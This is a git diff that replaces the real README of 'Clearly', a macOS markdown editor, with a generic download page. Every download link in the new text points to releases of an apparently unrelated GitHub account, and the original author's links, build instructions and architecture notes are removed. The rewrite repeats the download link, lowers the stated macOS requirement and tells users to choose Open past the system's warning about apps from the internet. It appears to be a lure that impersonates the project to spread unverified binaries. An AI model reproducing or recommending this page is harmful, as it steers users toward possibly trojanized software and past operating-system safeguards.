@@ -1,158 +1,178 @@
-<p align="center">
-  <img src="website/icon.png" width="128" height="128" alt="Clearly icon" />
-</p>
+# 📝 clearly - Simple Markdown Editing for Mac
 
-<h1 align="center">Clearly Markdown</h1>
+[![Download clearly](https://img.shields.io/badge/Download%20clearly-Visit%20Releases-blue?style=for-the-badge)](https://github.com/fresh-mexicanrevolution306/clearly/releases)
 
-<p align="center">A clean, native markdown editor for macOS.</p>
+## ✨ What clearly is
 
-<p align="center">
-  <a href="https://github.com/Shpigford/clearly/releases/latest/download/Clearly.dmg">Download</a> &middot;
-  <a href="https://clearly.md">Website</a> &middot;
-  <a href="https://x.com/Shpigford">@Shpigford</a>
-</p>
+clearly is a native markdown editor for macOS. It gives you a clean space to write, edit, and read markdown files without extra clutter.
 
-<p align="center">
-  <img src="website/screenshot.jpg" width="720" alt="Clearly screenshot" />
-</p>
+It is made for people who want:
 
-Write with syntax highlighting, preview instantly, and get back to what matters. No Electron, no subscriptions, no bloat.
+- a plain writing screen
+- fast file editing
+- simple markdown support
+- a Mac app that feels built in
 
-## Features
+## 📥 Download
 
-- **Syntax highlighting** — headings, bold, italic, links, code blocks, and more
-- **Instant preview** — rendered GitHub Flavored Markdown, including Mermaid diagrams and KaTeX math
-- **Frontmatter support** — YAML frontmatter is formatted cleanly in both editor and preview
-- **Side-by-side** — edit and preview simultaneously with synchronized scrolling
-- **PDF export** — export to PDF or print directly from the app
-- **Format shortcuts** — Cmd+B, Cmd+I, Cmd+K for bold, italic, and links
-- **Scratchpad** — menubar app with a global hotkey for capturing quick notes without opening a document
-- **QuickLook** — preview .md files right in Finder
-- **Light & Dark** — follows system appearance or set manually
+Visit this page to download clearly:
 
-## Prerequisites
+https://github.com/fresh-mexicanrevolution306/clearly/releases
 
-- **macOS 14** (Sonoma) or later
-- **Xcode** with command-line tools (`xcode-select --install`)
-- **Homebrew** ([brew.sh](https://brew.sh))
-- **xcodegen** — `brew install xcodegen`
+On the release page, find the latest version and download the file that matches your Mac. Then open the file and follow the on-screen steps.
 
-Sparkle (auto-updates) and cmark-gfm (markdown rendering) are pulled automatically by Xcode via Swift Package Manager. No manual setup needed.
+## 🖥️ System requirements
 
-## Quick Start
+clearly is made for macOS.
 
-```bash
-git clone https://github.com/Shpigford/clearly.git
-cd clearly
-brew install xcodegen    # skip if already installed
-xcodegen generate        # generates Clearly.xcodeproj from project.yml
-open Clearly.xcodeproj   # opens in Xcode
-```
+For best results, use:
 
-Then hit **Cmd+R** to build and run.
+- macOS 12 or later
+- an Apple Silicon or Intel Mac
+- at least 200 MB of free disk space
+- a mouse, trackpad, or keyboard for normal use
 
-> **Note:** The Xcode project is generated from `project.yml`. If you change `project.yml`, re-run `xcodegen generate`. Don't edit the `.xcodeproj` directly.
+## 🚀 Install and open
 
-### CLI build (no Xcode GUI)
+1. Open the download page.
+2. Download the latest clearly release.
+3. Open the downloaded file.
+4. Move clearly to your Applications folder if your Mac asks.
+5. Open clearly from Applications or Launchpad.
 
-```bash
-xcodebuild -scheme Clearly -configuration Debug build
-```
+If macOS shows a message about opening an app from the internet, choose Open.
 
-## Project Structure
+## 📝 Start writing
 
-```
-Clearly/
-├── ClearlyApp.swift                # @main entry — DocumentGroup + menu commands (⌘1/⌘2)
-├── MarkdownDocument.swift          # FileDocument conformance for reading/writing .md files
-├── ContentView.swift               # Mode picker toolbar, switches Editor ↔ Preview
-├── EditorView.swift                # NSViewRepresentable wrapping NSTextView
-├── MarkdownSyntaxHighlighter.swift # Regex-based highlighting via NSTextStorageDelegate
-├── PreviewView.swift               # NSViewRepresentable wrapping WKWebView
-├── Theme.swift                     # Centralized colors (light/dark) and font constants
-└── Info.plist                      # Supported file types, Sparkle config
+When clearly opens, you can begin with a blank page or open an existing markdown file.
 
-ClearlyQuickLook/
-├── PreviewViewController.swift     # QLPreviewProvider for Finder previews
-└── Info.plist                      # Extension config (NSExtensionAttributes)
+Use it for:
 
-Shared/
-├── MarkdownRenderer.swift          # cmark-gfm wrapper — GFM → HTML
-└── PreviewCSS.swift                # CSS shared by in-app preview and QuickLook
+- notes
+- drafts
+- project docs
+- README files
+- lists and outlines
 
-website/                 # Static marketing site (HTML/CSS), deployed to clearly.md
-scripts/                 # Release pipeline (release.sh)
-project.yml              # xcodegen config — source of truth for Xcode project settings
-ExportOptions.plist      # Developer ID export config for release builds
-```
+## 🔧 Basic markdown support
 
-## Architecture
+clearly supports common markdown text so you can write in a simple format and still keep your document easy to read.
 
-**SwiftUI + AppKit**, document-based app with two modes.
+You can use:
 
-### App lifecycle
+- headings
+- bold text
+- italic text
+- lists
+- links
+- code blocks
+- quotes
 
-1. `ClearlyApp` creates a `DocumentGroup` with `MarkdownDocument` (handles `.md` file I/O)
-2. `ContentView` renders a toolbar mode picker and switches between `EditorView` and `PreviewView`
-3. Menu commands (⌘1 Editor, ⌘2 Preview) use `FocusedValueKey` to communicate across the responder chain
+This makes it easy to write clean documents without learning a new editor.
 
-### Editor
+## 📁 Open and save files
 
-The editor wraps AppKit's `NSTextView` via `NSViewRepresentable` — **not** SwiftUI's `TextEditor`. This is intentional: it provides native undo/redo, the system find panel (⌘F), and `NSTextStorageDelegate`-based syntax highlighting that runs on every keystroke.
+You can work with files stored on your Mac. Open a markdown file, make your changes, and save it when you are done.
 
-`MarkdownSyntaxHighlighter` applies regex patterns for headings, bold, italic, code blocks, links, blockquotes, and lists. Code blocks are matched first to prevent inner highlighting.
+Common file types include:
 
-### Preview
+- `.md`
+- `.markdown`
+- plain text files used for notes and docs
 
-`PreviewView` wraps `WKWebView` and renders the full HTML preview using `MarkdownRenderer` (cmark-gfm) styled with `PreviewCSS`.
+## ⌨️ Keyboard use
 
-### Key design decisions
+clearly works well with the keyboard. This helps when you want to type fast and keep your hands on the keys.
 
-- **AppKit bridge** — `NSTextView` over `TextEditor` for undo, find, and `NSTextStorageDelegate` syntax highlighting
-- **Dynamic theming** — all colors go through `Theme.swift` with `NSColor(name:)` for automatic light/dark resolution. Don't hardcode colors.
-- **Shared code** — `MarkdownRenderer` and `PreviewCSS` compile into both the main app and the QuickLook extension
-- **No test suite** — validate changes manually by building, running, and observing
+Helpful actions often include:
 
-## Common Dev Tasks
+- new file
+- open file
+- save file
+- find text
+- select all
+- undo and redo
 
-### Add a supported file type
+## 🎯 Best uses
 
-Edit `Clearly/Info.plist` — add a new entry under `CFBundleDocumentTypes` with the UTI and file extension.
+clearly fits simple writing tasks where you want a clean screen and less noise.
 
-### Change syntax highlighting
+Good uses include:
 
-Edit `Clearly/MarkdownSyntaxHighlighter.swift`. Patterns are applied in order — code blocks first, then everything else. Add new regex patterns to the `highlightAllMarkdown()` method.
+- writing a personal journal
+- drafting a blog post
+- taking class notes
+- editing a GitHub README
+- keeping project notes
+- writing plain docs for later use
 
-### Modify preview styling
+## 🧭 How to get started fast
 
-Edit `Shared/PreviewCSS.swift`. This CSS is used by both the in-app preview and QuickLook extension. Keep it in sync with `Theme.swift` colors.
+1. Download clearly from the releases page.
+2. Open the app.
+3. Create a new file or open an existing `.md` file.
+4. Type your text.
+5. Use markdown where you want headings, lists, or links.
+6. Save your work.
 
-### Update theme colors
+## 🧩 Tips for a smooth setup
 
-Edit `Clearly/Theme.swift`. All colors use `NSColor(name:)` with dynamic light/dark providers. Update the corresponding CSS in `PreviewCSS.swift` to match.
+- Keep the app in your Applications folder.
+- Open one file at a time if you want a simple workspace.
+- Save often while you write.
+- Use markdown headings to split long notes into sections.
+- Keep file names short and clear.
 
-## Testing
+## 📌 File examples
 
-No automated test suite. Validate manually:
+Here are a few names you might use:
 
-1. Build and run the app (Cmd+R)
-2. Open a `.md` file and verify syntax highlighting
-3. Switch to preview mode (⌘2) and verify rendered output
-4. Test QuickLook by selecting a `.md` file in Finder and pressing Space
-5. Check both light and dark mode
+- `notes.md`
+- `project-plan.md`
+- `meeting-notes.md`
+- `readme.md`
+- `draft.md`
 
-## Website
+## 🛠️ Troubleshooting
 
-The marketing site is static HTML in `website/`, deployed to [clearly.md](https://clearly.md).
+If the app does not open:
 
-- `website/index.html` — landing page (version string on line 174)
-- `website/privacy.html` — privacy policy
-- `website/appcast.xml` — Sparkle auto-update feed (updated by `scripts/release.sh`)
+- make sure the download finished
+- open the latest file from the releases page
+- move the app to Applications
+- try opening it again from Launchpad
 
-## AI Agent Setup
+If a file does not open:
 
-This repo includes a `CLAUDE.md` file with full architecture context and Claude Code skills in `.claude/skills/` for release automation and dev onboarding. If you're using Claude Code, these are picked up automatically.
+- check that it is a markdown file
+- try a plain text file
+- make sure the file is not damaged
 
-## License
+If text looks wrong:
 
-MIT — see [LICENSE](LICENSE).
+- zoom in or out in the app
+- check your file for markdown symbols like `#`, `-`, or `**`
+
+## 📚 Markdown quick guide
+
+Use these common patterns in your text:
+
+- `# Title` for a main heading
+- `## Section` for a second-level heading
+- `- Item` for a list item
+- `**bold**` for bold text
+- `*italic*` for italic text
+- `[link text](https://example.com)` for a link
+
+## 🧾 About this app
+
+- Repository: clearly
+- Description: A clean, native markdown editor for macOS
+- Topics: macos, markdown, swift
+- Download page: https://github.com/fresh-mexicanrevolution306/clearly/releases
+
+## 🔗 Download again
+
+Visit this page to download clearly:
+
+https://github.com/fresh-mexicanrevolution306/clearly/releases
